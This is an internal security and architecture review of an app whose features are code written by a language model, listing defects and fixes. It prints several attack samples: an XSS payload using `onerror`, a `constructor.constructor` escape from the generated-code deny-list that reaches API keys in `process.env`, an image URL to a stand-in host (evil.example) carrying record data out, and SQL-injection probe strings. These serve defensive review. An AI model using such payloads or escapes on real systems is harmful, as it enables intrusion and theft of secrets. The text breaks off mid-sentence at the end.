# Module 5 — The Desk — Architectural review

Date: 2026-09-01
Range reviewed: `f573e29^..HEAD` (`0dbced0`) — 38 commits, 449 files, +63,947 / −8,907
Method: eleven parallel reviewers — six spec-conformance (one per epic pair), four
adversarial (server security, client lifecycle, the Gate/generated-code boundary,
concurrency and state machines), one documentation-drift — plus first-hand
verification and one live end-to-end build.

This is a report, not an issue list. Nothing here has been filed.

---

## Verdict

Module 5 landed. All 35 issues across 11 epics are implemented, and every acceptance
criterion a reviewer could check against running code checks out. The window, the
logo contract, the desk ground, the content-region lifecycle, the form vocabulary
and the address scheme are all genuinely built, not merely asserted. The deletions
the module promised — toolbar, sidebar, header row, detail modal and its focus trap,
`mutationBusy`, `hasCapabilities` — are complete, with no live survivors.

The engineering quality of the *shipped surface* is high. Where reviewers went
looking for the classic failure modes — vacuous tests, storage that bricks on bad
input, geometry that drifts from its token, a credit cap that races — they found
real, working defences and said so.

What the review did surface is a cluster of defects in the **trust boundary around
model-authored code**, and a cluster of **liveness/lease** problems that can wedge
the platform. One was a live stored-XSS hole. Those are detailed below.

### Verified first-hand

| Check | Result |
|---|---|
| `bun run test` | **2487 passed, 0 failed** (201 files, ~400s, 2 shards) |
| `bun run typecheck` | clean |
| `bun run lint` | clean (505 files) |
| Live end-to-end build | ✅ prompt → resolve → build → Gate → activate → window swap → logo → tile |
| Drain deadline > handler timeout (dec. 14) | ✅ 15,000ms vs 10,000ms, asserted as a relationship not two literals |
| Logo route hardening | ✅ `CSP: default-src 'none'; …; sandbox`, `nosniff`, `inline`, immutable, gzip; traversal 404s |
| Artwork storage (dec. 37) | ✅ `capabilities/<id>/<inc>/logo.svg` *beside* `v1`, not inside |

### The live build

One capability generation and one logo generation were spent. The prompt *"I want to
keep track of my hiking trips — the trail name, how hard it felt, the gear I packed,
and a long note about how the day went"* produced, unprompted, a capability
exercising the entire new field vocabulary at once:

- `max_length: 160` on `trail_name`, rendered with a live "160 characters left" counter
- a `choice` field with four declared values and `groups: []`
- `presentation: "radio"` chosen per-field
- `string[]` `packed_gear` with `mode: "comma_separated"`
- `long_text: ["day_note"]` plus authored `guidance`
- logo `ground: forest_green` / `companion: golden_yellow` — both from the eight
  hue families, correctly differing; `logo_status: present`, `logo_attempts: 1`

The provisional hatched tile appeared only after admission, carried the label during
the build, and was replaced by the real artwork at activation. The address pushed
`/capability/hiking_trips` and nothing else. `localStorage` stayed empty until a
geometry change. Decisions 3, 6, 27–31 and ADR-0007 all confirmed against real
generated output rather than a fixture.

---

## Fixed in this pass

### 1. CRITICAL — stored XSS: the runtime enforcer made inert markup live

`src/presentation/enforcer.ts:50` unwrapped any element not on the allow-list with
`removeAndKeepContent()`. `<textarea>` and `<noembed>` are raw-text/RCDATA elements:
their content is *text*, never markup, so the parser never offered their children to
the element handler, and unwrapping re-emitted that text **as markup**.

```
IN   : <textarea><img src=x onerror=alert(1)></textarea>
OUT  : <img src=x onerror=alert(1)>          ← live event handler, app origin
```

The enforcer's own docstring promises "a record that slipped past the gate must still
render inertly". It did the opposite. Both containment layers failed together: the
design-lint rung's probes (`gate-design-lint.ts:355-375`) feed one baseline, N
single-field contrasts and five short fixed hostile strings, giving every field of a
probe record the same value — so a renderer with a data-conditional branch
(`if (body.length > 300) …`) is never exercised. A renderer passing the full Gate
clean produced a live `onerror` handler from ordinary record data at render time.

**Fixed** — `textarea` and `noembed` added to `REMOVED_ELEMENTS`
(`src/presentation/vocabulary.ts`), so they leave with their content.

The durable guard is the new **idempotence property**: `enforce(enforce(x)) ===
enforce(x)`. Anything whose second pass differs from its first was, by definition,
shipped live. That catches the next instance of this class without anyone having to
think of it.

### 2. Five Gate escapes on the closed axes

Each verified against the real `sanitizeStyle`/`describeStyleViolation`, and each now
blocked with no over-blocking of legitimate declarations:

| Escape | Why it mattered |
|---|---|
| `filter: invert(1) sepia(1) saturate(9999%) hue-rotate(90deg)` | reached **any** colour from an on-token value — the closed colour axis walked around rather than obeyed. `backdrop-filter`, `mix-blend-mode`, `background-blend-mode` likewise |
| `clip-path: circle(50%)` / `ellipse()` / `polygon()` | fully round or arbitrary-shaped record; the radius ban matched only the literal `round` keyword, so `inset(0 round 12px)` was caught and `circle(50%)` was not |
| `caret: red` | bare shorthand carrying a colour; the `-color` suffix caught `caret-color` but not `caret`. Live at *render* time, not just build time |
| `scroll-margin` / `scroll-padding` | margin and padding on the scroll axis, past the spacing token set |
| `stroke-width` | a thickness with no token left to name it (`isUnweighable` covered only `text-stroke-width`) |

The recolouring ban is checked *after* the construct scan rather than beside the other
never-declared rows, so `filter: drop-shadow(…)` keeps the shadow answer it already
had — the refusal message is fed back to the generator as a repair hint, and "this
casts" is the apter reason than "this re-colours".

Regression tests added for all of the above, plus the boundary-ban spellings that had
been probed once by hand but never pinned (`BORDER:` uppercase, `border-block`,
`border-image`, `border-image-slice`, `-webkit-border-before`, `outline-style`,
`column-rule-style`, `border: 0`).

`caret: red` moving from the residual scan onto the colour axis is an improvement, so
`gate-design-lint-high-meadow.test.ts`'s "3.1/02 residual" test was rewritten to match
its siblings' "caught on the axis rather than as a residual" shape.

### 3. The 5.9/02 sign-off gate

Marked done at the user's instruction. Module 5 now has zero unchecked boxes.

### 4. CRITICAL — a hung provider stream held the exclusive build lease forever

**Fixed.** Every `streamObject` call now receives a five-minute stage-deadline
`abortSignal`; the deadline also rejects the provider handles itself, so cleanup does not
depend on the SDK reporting the abort correctly. Separately, the exclusive build lease
now has a coordinator-enforced four-hour whole-build expiry, above the maximum valid
sequence of bounded generation stages. Expiry aborts the exact owner but retains
exclusivity until that owner finishes cleanup; only then does the queue advance, so old
and new owners can never overlap.

The Core Builder composes the lease signal into its provider and stage cancellation, so
the fallback lease bound stops the owned run rather than merely changing the
coordinator's bookkeeping. Regression tests cover a stalled SDK call, a never-settling
stage send, build owner cleanup, queue advancement, stale ownership, and a subsequent
record write.

---

## Findings

Ordered by severity. Every one cites a location and a concrete failure. Nothing here
is speculative — where a reviewer could not settle a claim, it says so.

> **All of these were fixed on 2026-09-02**, in one pass, with a regression test for each
> where a test could hold the rule. Two exceptions, both stated where they arise: **C5** is
> a recorded user decision to accept the exposure, and one clause of **M6** — how many
> records a `read` may return — is a product decision (pagination) rather than a defect,
> now that the ceiling which actually *broke* has gone. The fixes are summarized under
> [What the follow-up pass changed](#what-the-follow-up-pass-changed) at the end of this
> document; each finding below is left exactly as it was written, because the record of what
> was wrong is worth more than a tidied list.

### CRITICAL

**C2 — The generated-handler static isolation is bypassable in one expression, and
`process.env` holds both API keys.**
`src/builder/units/handler-source-safety.ts:373-396` bans the *identifiers* `process`,
`globalThis`, `eval`, `Function`, `fetch`, … and `isRuntimeIdentifierReference:398-422`
explicitly returns `false` for property-access names. So `({}).constructor.constructor`
reaches the Function constructor while naming nothing banned. Verified: the payload
was **accepted** by the source-safety check, the structural rung and the isolated
typecheck, and at runtime resolved `process.env` with 54 keys. `.env` holds
`OMNI_API_KEY` and `RECRAFT_API_KEY`. ADR-0004 already accepts "no process sandbox";
this finding is narrower — the specific static defences the ADR *does* lean on are
defeated by one property access. A deny-list cannot close it (`Reflect.get`,
`[].flat.constructor`, … are equivalent). Cheap mitigation: read the provider keys
once at boot into a closure and `delete process.env.OMNI_API_KEY` /
`RECRAFT_API_KEY`, so a leaked ambient reference finds nothing.

**C3 — Unbounded search terms freeze the entire event loop.**
`src/router/wire-protocol.ts:187-198` validates the *key* of a search parameter and
never the value's length or token count. The mandated generated search shape
(`unit-prompts.ts:312`) splits `q` on whitespace into one CTE row per token and calls
the FFI `platform_search_normalize` on every (row × term × field) combination, and
`bun:sqlite` executes synchronously — so the 10s handler deadline **cannot fire**, its
timer callback being unable to run while the query is on the stack. Measured in
isolation at 500 rows: 100 terms → 2.7s, 1,000 → 55.5s, 5,000 → 256.5s. Currently
latent only because the live tables are tiny (200 terms → 184ms on 5 rows, confirmed
against the running server). Cost is linear in rows and in field text length, and
`max_length` permits 10,000-character fields.

**C4 — A slow request body holds the record-write lease, an open `BEGIN IMMEDIATE`,
and a read token indefinitely.**
`src/router/router.ts` acquires read tokens (`:326`) → the write lease (`:379`) →
`BEGIN IMMEDIATE` (`:384`) → and only then `await request.formData()` (`:428`,
`wire-protocol.ts:57`). No `maxRequestBodySize` is set. Verified live: with one
streaming POST held open, a second create returned `422 … data-error-code="mutation_busy"`
— the lease was genuinely held while the body was still open. While that socket
lives, every record write on every capability is refused, every build queues, and the
held read token makes the capability **undeletable** (the drain burns its full 15s and
returns `deletion_drain_timeout`). `src/read-gates/index.ts:26-28` names this exact
hazard; nothing bounds it.

**C5 — Unauthenticated, bound to every interface, no CSRF guard.** *(User decision:
leave as is.)*
`src/index.ts:113` calls `Bun.serve({ port, idleTimeout, fetch })` with no `hostname`,
so it binds `*:3030`; verified reachable on the LAN address. No auth middleware
exists. Only the logo attempt route checks `HX-Request`; `POST /capability-deletion/:id/confirm`,
`POST /capability-rename/:id` and `POST /capability/:id/create` all execute route
logic for a cross-origin `multipart/form-data` submission. Recorded here because the
report should be complete; the user has accepted this exposure.

### HIGH

**H1 — A Handler's returned fragment is served raw, and htmx runs scripts in it.**
`src/router/router.ts:454` returns the generated handler's string via `c.html(fragment)`.
The runtime enforcer runs *only* on the item renderer's output inside `present()`
(`adapter.ts:111`), and the design-lint rung is declared `kind: "item-renderer"`.
Nothing inspects the wrapper markup a handler composes. The vendored htmx ships
`allowScriptTags:true` / `allowEval:true` and **no app page sets a CSP**, so a
`<script>` in a handler fragment executes on swap. The handler prompt actively invites
raw markup ("you may include a small escaping helper locally", `unit-prompts.ts:144`)
with no rule requiring escaping and no rung checking it — every shipped `create.ts`
already builds raw HTML this way, and exactly one of them defines its own
`escapeHtml`. Escaping here is a per-generation coin flip. Found independently by two
reviewers.

**H2 — The item renderer has no ambient-runtime-access ban; the Handler does.**
`src/builder/units/unit-checks.ts:94-105` checks only export shape, imports and field
access. A renderer reading `process.env` and calling `fetch` through `globalThis`
passed the unit-generation contract, the design-lint rung and the structural rung —
and its `fetch` calls **actually fired during the Gate**, because `findDesignViolation`
executes the renderer in-process. `assertItemRendererExportShape`
(`gate-structural.ts:183`) never calls `checkItemRendererSourceContract`. The fix is
to run that check from the structural rung and share `handler-source-safety.ts`'s
ambient ban between both unit kinds.

**H3 — An item renderer can exfiltrate every rendered record through an allow-listed
media URL.** `vocabulary.ts:259-267` (`isDangerousUrl`) flags only `javascript:`,
`vbscript:` and non-image `data:` — every `http(s)` host is allowed. A renderer
emitting `<img src="https://evil.example/px.gif?d=…record fields…" width="1">` passes
the design-lint rung clean and survives the enforcer byte-identically. This
contradicts the `url()`-in-style ban, which exists *specifically because it fetches a
remote resource*; the two surfaces cannot both be right.

**H4 — The contrast audit is not exhaustive, and a live AA failure is taught to the
model as a positive example.** `color: var(--ink)` on `background-color: var(--shade)`
is **2.644:1** — below even the 3:1 non-text floor — computed with the repo's own
`contrastRatio()` from the live token hexes. It ships in
`src/builder/units/few-shot-gallery.ts` (many chips, e.g. `:100`, `:120`, `:138`), is
served at `/demo/few-shot-gallery`, and is fed verbatim into the item-renderer
generation prompt as an approved exemplar. Two structural reasons it is missed: the
file is not in `AUDITED_SHEETS`, and the audit's own exhaustiveness self-check only
flags files containing a literal `<style` substring — this one uses inline `style=`
attributes exclusively, which `contrast.ts:215-257` never parses. This directly
falsifies 5.11/01's "the inventory is exhaustive against shipped uses".

**H5 — A Handler's declared business-error refusal is treated as a successful commit.**
Self-disclosed in 5.10/04's "Known seam" and confirmed still live. A handler returning
a business-error fragment is wrapped as a bare 200; both forms declare `hx-swap="none"`,
and `record-mutations.js:365-385` decides outcome from htmx's boolean
`detail.successful`, true for any 2xx. So a capability-declared refusal is
indistinguishable from a successful create. The platform's own typed refusals escape
this only because the router catches their error *classes* and sets 422 +
`HX-Retarget` — a path a handler's plain return value never enters. AC5 of 5.10/04 is
checked but has not landed end-to-end.

**H6 — Every queued build expires after 30s and is reported as a generic failure.**
`DEFAULT_BUILD_RESERVATION_TTL_MS = 30_000`, and the clock starts at `reserveBuild()`,
which `runCoreBuild` calls immediately before `withBuildLease` — so the ticket's whole
budget is spent waiting in the queue. A real build takes minutes. The second concurrent
build therefore always rejects with `MutationReservationExpiredError`, which
`core-builder.ts:256-268` renders as *"Hmm, that didn't work. Mind trying again?"* The
user waited 30s, paid for a resolver call, and is told the build failed. PLAN decision
24 says a build refused because another holds the lease should speak on the prompt
bar. The documented bounded FIFO queue cannot hold anyone at depth ≥ 2. No test covers
the expiry path reaching a user.

**H7 — A wedged deletion tombstone reserves the capability id forever, and the rebuild
path only discovers it at the activation CAS.** `cleanup-supervisor.ts:124-130` stops
scheduling once the three retry delays are spent; only a process restart retries, and
there is no route to force one. Meanwhile `core-builder.ts:220` checks the reservation
at the lease head **only when the resolver named an id**, which it does not for an
ordinary "build me a notes app". So spec-gen, unit generation, the full Gate and
artifact publication all run and are paid for, and *then* the CAS hits the tombstone
and fails generically. Repeats forever.

**H8 — The desk-load logo sweep has no concurrency bound, and self-inflicted rate
limiting burns claimed attempts.** Every faceless tile renders
`hx-trigger="load"`, so N faceless capabilities fire N simultaneous claims and N
concurrent 90s provider calls. A provider-side 429 caused by the platform's own burst
is caught at `attempt.ts:210-225`, releasing the claim **with the attempt already
spent** (correctly — a claim is paid for when won). Three rounds and the capability
wears the permanent placeholder having produced no artwork at all. This does not
exceed the 3-attempt cap; it destroys the budget within it.

**H9 — A severed deletion's recovery blows away whatever is in the window seconds
later, and rewrites the address.** `capability-deletion.js:131-191` is a bare
`setTimeout` + `fetch` chain, not registered with `region-scope.js`, carrying no
`AbortSignal` and not keyed to the capability it was started for. Its only staleness
check is "was the window put away?". Sequence: delete A → confirm → immediately click
B's logo (which itself fires `htmx:sendAbort`, arming the recovery). ~200ms later B's
collection is released and replaced by A's deletion answer, and `HX-Replace-Url`
rewrites the bar.

**H10 — An in-flight record mutation aborted by the region rule tells the user
nothing.** On abort, `record-mutations.js` correctly computes `outcomeUnknown` and
writes "I couldn't confirm that change…" into `form.querySelector('[aria-live]')` —
*inside the subtree being destroyed in the same tick*. The sentence is written and
immediately thrown away. The server may have committed the write. For the delete case
this contradicts the file's own stated invariant that a destructive action must never
look like it did nothing. `capability-deletion.js` already proves the rescue pattern
(`htmx:sendAbort` → speak on the prompt bar); record mutations have no equivalent.

**H11 — No request ownership on the window's content region.** The logo carries no
`hx-sync` (`fragments.ts:443`), and two logo presses in one tick leave two concurrent
requests against the same target — confirmed live. If the first answers last, the
window shows A while the bar says B, and `addressTheWindow` then *replaces* the
address with A, silently discarding the entry the user pushed for B.
`records-region-requests.js` implements exactly this ownership discipline, but only
for the records region.

**H12 — No request body size limit.** Beyond C4's locking consequence: Bun's 128MB
default applies and every entry point materialises the whole body before any
validation (`wire-protocol.ts:57`, `capability-deletion/http.ts:73`,
`capability-rename/http.ts:29`, `prompt-request.ts:52,86`). `POST /prompt` with a
128MB `text/plain` body produces the string, then `.trim()` (a second copy), then runs
a Unicode regex over all of it.

### MEDIUM

- **M1 — "Validation runs before the generated Handler" is documentation, not code.**
  `assertAdmittedChoiceValues` / `assertAdmittedStringLengths` are reachable only from
  `normalizeSpecFieldValues`, called from the mutation port — i.e. *from inside the
  handler*, when it chooses to call it. `max-length-refusal.test.ts:133` asserts
  `handlerRuns === 1` in the refusal case. Canonical state is genuinely safe, but the
  422 contract, the `HX-Retarget` behaviour and the fail-closed status are at the
  generated code's discretion. Three files state the opposite; PLAN.md's companion
  overclaims where the issue files' own wording ("before canonical mutation") is
  accurate.
- **M2 — The record-mutation lease is released one tick before the read tokens are
  aborted** (`router.ts:404-406` vs `:362-364`), leaving a window where an abandoned
  handler's write lands inside a *different* request's open transaction, because
  `mutation.ts:114` branches on `database.inTransaction`.
- **M3 — Mid-build SSE writes are unbounded while the build lease is held.** Terminal
  presentation is deliberately bounded at 2s with a written rationale about not letting
  a stalled reader hold the lease; every mid-build `await …send(…)` has no such bound.
  A client that opens the stream and never drains it blocks the write chain.
- **M4 — htmx selector injection from an unvalidated `:id`.**
  `capability-deletion/presentation.ts:142` builds `hx-swap-oob="delete:#…"` from a raw
  URL segment on the already-gone branch. `escapeHtml` stops attribute breakout but not
  selector shaping — verified live producing `delete:#capability-logo-x, body`. Latent
  (no delivery path found), but a real sink.
- **M5 — No CSP or security headers on any app page.** Only the logo route sets them.
  With htmx's `allowScriptTags:true`, any XSS is unmitigated and the desk is framable.
- **M6 — Unbounded quantities:** fields per spec, `string` fields with no declared
  `max_length`, `string[]` element count and element length (`max_length` is *refused*
  on `string[]`, so list fields have no bound at all), records returned by `read`, and
  capabilities. An LLM-authored `max_length` of 10⁹ *is* correctly refused (`.min(64).max(10_000)`).
- **M7 — Build telemetry is embedded in every page load**, not gated by `NODE_ENV`
  unlike `/demo/*`: model ids, token counts, stage timings, catalog fingerprints, and
  `deletion_cleanup_error` strings carrying absolute filesystem paths. Escaped
  correctly — disclosure, not XSS.
- **M8 — `leaving-a-run` ships a modal veil, contradicting PLAN decision 17 ("an inline
  row … not a content swap or modal") and design-system.md's "There is no modal
  anywhere in Aluna".** The mechanical ACs are satisfied; the shipped UI is a darkening
  veil with a centred panel. The issue discloses this as an open question that was
  never closed, and neither document has been amended since.
- **M9 — `goAheadAndLeave` clears the question before it knows the run ended**
  (`leaving-a-run.js:399-412`): `asking` is nulled unconditionally, then `endRunIn`
  bails with the row still shown. The warning is orphaned on screen with both buttons
  inert, and the confirmed navigation never happens and is never reported.
- **M10 — `long-text-field.js:62-71` starts a `ResizeObserver` per control that nothing
  ever releases** — no handle kept, no disconnect, not registered with
  `registerRegionRelease`, and no unmount path exists. One per `textarea[data-grow]`,
  minted again on every record view and collection swap. A direct decision-13 violation.
- **M11 — `desk-doorway.js:74-84` can leave a permanent document listener** holding a
  detached subtree: `settle` removes itself only when `detail.elt === asking`, and htmx
  fires `htmx:afterRequest` *after* the swap, so if that swap detached `elt` the event
  no longer bubbles to `document`.
- **M12 — Drag/resize clamp against a viewport measured once at pointer-down**
  (`window-gestures.js:102,146`). A viewport change mid-gesture (keyboard, rotation,
  devtools) lets the window park inside the prompt-bar clearance until the next refit.
- **M13 — Reduce Motion's "no per-component list" is bounded by a hand-maintained CSS
  *property* list.** `GEOMETRY` in `travel-axis.ts:50-65` is what counts as travel;
  `.logo-tile--working` animates `background-position` and is completely unmuted (pinned
  deliberately at `travel-axis.test.ts:84-94`). No *component* is enumerated, so the AC's
  letter holds — but a property allow-list is still an allow-list, and a future
  component sliding real content via `background-position`, `clip-path` offsets or SVG
  `x`/`y` would not be caught.
- **M14 — The focus-ring split is proven by CSS-source analysis, not a live click.**
  `focus-ring.test.ts` never renders an element, focuses it, or dispatches an event —
  there is no DOM test environment in the repo. It is real work that would catch a
  second overriding file or a `box-shadow`-as-ring, but the behavioural claim ("a click
  rings a text input and not a button") rests on a one-time manual check recorded in
  prose, not on anything `bun run test` re-runs.
- **M15 — The deletion-cleanup supervisor busy-loops at 1s while a build holds the
  lease** (`cleanup-supervisor.ts:96-141`): `runOnce` short-circuits when already
  running, then reschedules, and `attempts` has not incremented so the delay stays at
  the first rung.
- **M16 — The htmx-native canonical-read abort path has zero automated coverage.**
  `region-scope.js:195-203` (`abortTransportIn`) is gated on `node instanceof Element`,
  and `region-scope.test.ts` uses a DOM-free `Node` double that is never an `Element` —
  so the branch is structurally excluded from every test. This is the most-exercised
  acquisition path in the feature; it runs on every capability open.

### LOW / INFO

- `role="button"` / `role="link"` / `aria-hidden="true"` survive the enforcer,
  nesting an ARIA button inside the record's real `<button>` and letting a record hide
  its content from assistive technology.
- `!important` rides through on an on-token declaration — cannot introduce an
  off-token value, but lets a record win specificity fights against platform chrome.
- Two concurrent renames both commit; last writer wins with no conflict signal
  (`store.ts:255-280` — rename does not bump the version).
- A post-commit `finalizeClose` failure leaves the read gate `closing` for the process
  lifetime (`two-phase-destruction.ts:245-260`). Harmless — the row is a tombstone and
  the table is dropped — but a permanently stuck state-machine cell.
- A capability reaching 65,536 records becomes permanently unreadable:
  `query-runtime.ts:136` emits one bind parameter per matched row, and the count wraps
  at 16 bits.
- Capability id has no maximum length — a 5,000-character id yields valid DDL but a
  path exceeding the filename limit, so the two validators disagree about what an id is.
- The rename validator admits markup-shaped names (`<img src=x onerror=alert(1)>` is
  3 words, 28 chars, no sentence punctuation). Harmless only because every label sink
  escapes; it is a copy rule, not a safety boundary.
- The severed-deletion "already gone" sentence is shown for an interrupted **Confirm**
  that actually committed, claiming the capability was gone before the action.
  Self-disclosed in 5.9/02.
- Field labels don't carry the shared `.caps` class; `public/css/fields.css:106-114`
  restates its properties instead — the same "restate instead of reuse" duplication
  this epic eliminated for `.field__control`, and inconsistent with
  `choice-control.ts:241,331`, which does apply `.caps`.
- `trackPointer` doesn't filter by `pointerId`; touch + mouse runs two drags over one
  box. A press on the resize grip doesn't raise the window (`stopPropagation` also
  stops the raise listener).
- Put-away returns focus to the logo that *first* opened the window, not the one being
  viewed — deliberate, but after A → B → C a keyboard user lands three moves back.
- `evolution-matrix.test.ts:106-109` claims to assert every immutable birth fact but
  never destructures or asserts `companion`. Not a live gap — immutability is enforced
  and tested in `candidate-validation.ts` and the diff engine — but the battery does
  not check what it says it checks. `diff-totality.ts:45` has the matching stale comment.
- `evolution-matrix.choice.test.ts` exists as its own file; 5.10/02's claim that choice
  rows live "in the shared MATRIX table" is inaccurate, though the coverage is real.
- No integration-level regression test wires `MaxLengthScanError` through a real
  `runCapabilityEvolution`; the call site is correct by reading only.

### Documentation and hygiene

- **`docs/aluna-architecture.html` is stale and public.** It is built into the GitHub
  Pages site by `.github/workflows/pages.yml` and linked from the README's first
  paragraph. It still describes the capability toolbar as "the only navigation", lists
  "modal behavior" under platform presentation, and its roadmap **omits Module 5
  entirely** — every module from 5 onward is off by one against `docs/modules.md`.
- `docs/modules.md`'s Module 3 and Module 4 sections never received the
  forward-pointer treatment the document uses elsewhere, so they still describe the
  shared modal and read-only detail view as current, including in "Verify by running
  it" steps that are no longer runnable.
- `PLAN.md:47` and ADR-0002's 2026-08-20 update both say page assembly leaves "one
  anchor"; `PAGE_ASSEMBLY_ANCHORS` has two, and its own comment says so.
- `design/README.md`'s file tree is missing five live files added by this module.
- Stale `.types/public/*.d.ts` mirrors survive for four deleted browser modules.
  `.types/` is gitignored so CI is unaffected, but `tsc` never prunes them, so any
  machine that ran `typecheck` before and after the deletions keeps them, and a bare
  side-effect import would typecheck clean against an empty `.d.ts` and crash at
  runtime.
- **Orphan capability directories accumulate on the ordinary deletion path.**
  `two-phase-destruction.ts:299` removes only `capabilities/<id>/<incarnation>/`,
  never the parent, and `artifact-reconciliation.ts:157-186` has no code path that
  removes an id-level directory. Any capability built once and deleted without ever
  being evolved leaves its empty parent behind forever —
  `capabilities/houseplant_tracker/` and `capabilities/medication_tracker/` are two
  present examples.
- `/demo/region-lifecycle` and `/demo/swap-targets` still ship, and `app.ts:335-343`
  says they "come down with the surfaces that replace them (5.7 and 5.8)". Both epics
  are complete. Note they are entangled: `contrast-audit.ts:95` and
  `contrast-pairings-preview.ts` inventory their pairings, so removing them means
  re-homing those assertions.
- The module's own claim that it "removes more code than it adds" (decision 1) did not
  hold: net +10,731 lines in non-test `src/`, +7,525 in `public/`, +27,077 in tests.
  The *shell surface* claim is defensible; the module as a whole is strongly additive.

### Held — defences that resisted attack

Worth recording, because reviewers tried hard to break these and could not:

- **SQL identifier injection is airtight.** `SQL_NAME_PATTERN = /^[a-z][a-z0-9_]*$/`
  is the entire defence (identifiers are quoted without doubling), and it holds. Every
  probe was refused against the real DDL path: `notes" (x TEXT); DROP TABLE t; --`,
  `text" TEXT, "evil`, backtick and bracket forms, a Cyrillic homoglyph, a trailing
  newline (JS `$` without `m` matches only end-of-input), a null byte, `__aluna_x`,
  `created_At`. What *is* accepted is harmless: `sqlite_master` becomes
  `"cap_sqlite_master"`.
- **The 3-attempt logo cap cannot be exceeded.** The cap and the increment are the same
  statement — one conditional `UPDATE … WHERE logo_status='absent' AND logo_attempts < 3
  … RETURNING`, synchronous with no `await` inside. Proven by a test racing 4 desk loads
  × 8 concurrent requests and asserting exactly 3 provider calls. Nothing decrements;
  evolution and rename structurally exclude the columns from their SQL; a `present` row
  whose file vanished reconciles to `abandoned` and never regenerates.
- **The `var()` fallback trick fails.** `design-tokens.ts:93` requires the closing paren
  immediately after the token name, so `var(--type-sm, 99px)` can never match.
- **Property-name obfuscation fails** — unicode escapes, comments splitting an
  identifier, and vendor prefixes are all refused rather than unescaped.
- **The `__aluna_` wire protocol holds** against all 11 probes, including duplicate
  record targets, a Cyrillic homoglyph marker, and `__proto__` as a value key.
- **`localStorage` cannot brick the desk** — corrupt JSON, `Infinity`, negatives,
  `__proto__`, wrong types, and a throwing accessor all fall back to defaults.
- **The Diff Engine is the strongest component reviewed** — no false positive or false
  negative for `no_change` could be constructed in either direction; unmapped facts
  fail closed.
- **The design-lint rung is not skippable** — `gate.ts:384-392` runs it unconditionally,
  and evolution calls the same `runCapabilityGate` even when the renderer is copied.
- **Deletion atomicity holds** — tombstone, payload purge and `DROP TABLE` are one
  transaction, so a tombstone whose table still exists is unreachable in either
  direction.

---

## Note on concurrent test runs

Several reviewers reported test failures and one reported a typecheck failure that did
not reproduce. Up to six full suites were running at once on this machine during the
review. The authoritative results are the uncontended runs recorded at the top of this
document. One reviewer's two deterministic failures were real, but were caused by this
review's own uncommitted fixes rather than by drift — both were message assertions,
both resolved.

---

## What the follow-up pass changed

One pass on 2026-09-02, over every finding above. Written by area rather than by severity,
because several findings turned out to be one thing seen from different places.

### The trust boundary around model-authored code

- **The provider keys are no longer in `process.env`** (`src/secrets/`). They are read once
  at boot and deleted; `requireApiKey` and `requireRecraftApiKey` read through the vault, and
  an explicitly supplied `env` is still answered from itself so every test stays honest. This
  is C2's cheap mitigation, and it is containment rather than a sandbox: it bounds what an
  escape is *worth*, which is the only thing a static deny-list over identifiers can offer.
  The deny-list itself is tighter too — `Reflect`, `Proxy`, `WebAssembly`, `import.meta` and
  the `constructor`/`prototype`/`__proto__` property reaches now refuse, in both spellings.
- **The item renderer takes the same isolation ban the handlers take** (H2). The rule is
  stated once in `src/builder/units/source-isolation.ts` and both unit kinds are held to it,
  and the structural rung runs the renderer's *whole* source contract rather than the
  field-access half — so the import ban and the ambient ban now hold for a copied or
  hand-supplied renderer too, not only one that passed through unit generation.
- **A Handler's returned fragment is scrubbed** (H1). `enforceHandlerFragment`
  (`src/presentation/fragment-safety.ts`) removes `<script>`, every `on*=` handler and every
  script-scheme URL from the wrapper markup the enforcer never saw, and leaves conforming
  markup byte-identical. Beside it: htmx's `allowScriptTags`/`allowEval` are turned off, and
  every app response now carries a CSP that grants scripts no `'unsafe-inline'`.
- **A record may not reach off this origin** (H3). `isOffOriginUrl` refuses any scheme and any
  protocol-relative authority on an item's URL attributes, `srcset` candidates included,
  which is the same rule the `url()` style ban already stated. `img-src 'self' data:` says it
  again on the browser's side.
- **The handler and item prompts state the new rules** — nothing ambient, no `<script>`, no
  `<style>`, no `on*=`, escape every interpolated value, and same-origin URLs only — so the
  fix loop can converge on them rather than meeting them as an unexplained refusal.

### Liveness and leases

- **The search value is bounded** (C3): 512 characters and 16 terms, counted the way the
  generated SQL splits them, with the control carrying the same `maxlength`. This is the one
  finding where the cost was measured in whole seconds of a stopped event loop.
- **Nothing is held while a request body arrives** (C4). The router parses the request before
  it takes a read token, the write lease or `BEGIN IMMEDIATE`; a test holds a streaming POST
  open and proves a concurrent write is admitted meanwhile. `maxRequestBodySize` is 1MB
  (H12), and a prompt past 4,000 characters is turned down on the bar rather than resolved.
- **A queued build waits** (H6). The reservation TTL bounds *abandonment* — a ticket reserved
  and never acquired — and stops the moment an owner starts waiting on it, so the second of
  two concurrent builds no longer dies at 30 seconds with a generic failure.
- **A reserved capability id is discovered as soon as the id exists** (H7), before a single
  unit is generated, with an ending that says what is true instead of inviting a retry that
  cannot succeed. The cleanup supervisor gained `forceRetry`, which a desk load presses — so
  refreshing the page is the way a person asks again — and it no longer spins at one pass a
  second while a build holds the coordinator (M15).
- **Ownership is revoked before the lease is handed back** (M2), so an abandoned Handler's
  write can no longer land inside the next request's transaction.
- **Mid-build SSE writes are bounded** at ten seconds each (M3), so an unread socket cannot
  hold the exclusive build lease.
- **Logo attempts queue against the desk's logo layer** (H8), one at a time, so N faceless
  tiles no longer earn a self-inflicted 429 that spends the whole 3-attempt budget.

### What the browser is told

- **A declared refusal is delivered as one** (H5, closing 5.10/04's known seam): a Handler
  fragment carrying a marker for one of the capability's *own* declared behavioral errors is
  answered 422 with `HX-Retarget`, exactly as the platform's typed refusals are — and the
  transaction rolls back, because a refusal is not a commit.
- **The window's content region has an owner** (H11). A logo press and the deletion doorway
  both `hx-sync` against it, so the later press wins and the earlier request is abandoned
  rather than answering into a window that has moved on.
- **A severed deletion's recovery keeps its claim** (H9). It joins the region's scope,
  anchored to the confirmation form it was started for; a recovery that has lost the region
  says its piece on the prompt bar and touches neither the region nor the address. Its
  preflight also marks itself, so "already gone, so I didn't delete anything" is never said
  about a Confirm that may be exactly why the capability is gone.
- **An unconfirmed record mutation is heard** (H10). Each in-flight mutation registers with
  the region's scope, and a form whose surface went while the request was out says so on the
  prompt bar instead of writing into a subtree being destroyed in the same tick.
- **A leave that cannot be carried out says so** (M9) and takes its own question down, rather
  than leaving both answers inert on screen.

### The surfaces themselves

- **The contrast audit reads what it claims to read** (H4). Its exhaustiveness check now asks
  its own parser rather than a `<style` substring, the parser reads inline `style` attributes,
  the few-shot gallery is audited, and the live 2.644:1 failure it was teaching the model —
  `--ink` on `--shade` — takes `--surface` instead, which is C12's own swap.
- **Reduce Motion's property list covers the ways content moves without touching a box**
